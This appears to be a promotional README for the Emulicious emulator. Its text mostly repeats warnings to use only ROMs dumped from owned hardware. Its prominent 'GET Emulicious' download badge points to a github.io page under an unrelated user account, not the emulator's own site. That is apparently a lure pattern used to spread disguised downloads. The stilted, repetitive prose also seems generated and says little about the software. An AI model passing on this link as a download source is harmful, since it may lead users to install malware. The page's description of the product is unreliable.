# Emulicious - Play Dumps You Made from Hardware You Own

[![GET Emulicious](https://img.shields.io/badge/GET%20%E2%80%94%20Emulicious-ca8a04?style=for-the-badge&logoColor=white)](https://bettyphillipsb755.github.io/.github/emulicious-tiles)

## Game Overview

Emulicious plays software from handheld and 8-bit systems it supports, using files you dumped from cartridges or hardware you own. Game Boy and Game Boy Color dumps are the usual start, along with Sega 8-bit dumps you made yourself. The emulator does not include games. An empty window is the correct first launch. This page does not say where to download ROMs.

A debugger is for a program you wrote or a dump you are allowed to study. It is not a step toward a copy you did not make. Save states are your progress. The dump you made is the thing to keep. If you do not already have a file from hardware you may use, there is nothing to load.

## Play Your Way

Play. Point Emulicious at one dump you made, confirm the picture moves, and close it. That proves the file and the emulator. Keep the dump in a folder you can back up. Do not add a second system until the first file opens.

Use the debugger only on that same kind of file: yours. Breakpoints and memory views do not create a game you do not have. If a guide's next step is a ROM site or a BIOS pack from the internet, close the guide. Keys or system files, if you need them, come from hardware you own.

## Mission Flow

Install and open Emulicious. Leave the list empty if your dump is not copied yet. Add the folder that holds the file you made. Launch that file.

If it does not boot, the dump may be incomplete. Do not replace it with a download. Try the dump again from the cartridge or the hardware you own, or stop. When a game runs, close the emulator and leave the file where you put it. A save state is not a substitute for the dump.

## Included Content

- A player for dumps you already made
- Support aimed at Game Boy, Game Boy Color, and Sega 8-bit files you dumped
- A folder you choose, with no built-in game list
- Save states kept as your own progress
- A debugger for code you are allowed to inspect
- No ROM catalog and no download path for games

## Perfect Audience

Emulicious fits a cartridge or a handheld you own, when you already dumped the software and want it on this PC. One file is the right test.

It does not fit a search for games, a pack of ROMs, or a system file you found online. If the dump will not run, the fix is a dump you make again from hardware you own, or no game. The debugger does not change that.

## Common Issues

An empty list means you have not added your folder. That is normal. A file that fails to start is a bad or incomplete dump, not a missing download. Do not follow a link that offers the game. Frames that stutter can wait until one clean file runs. If a page tells you to grab a BIOS or a ROM set, stop. Use a file you dumped yourself or do not run that title.

## Extended Notes

Keep dumps with your other personal files, in a folder you can name. Save states can sit beside them. The emulator does not need to stay running, and it should not be pointed at a folder of files you did not create. Close it when you are done.
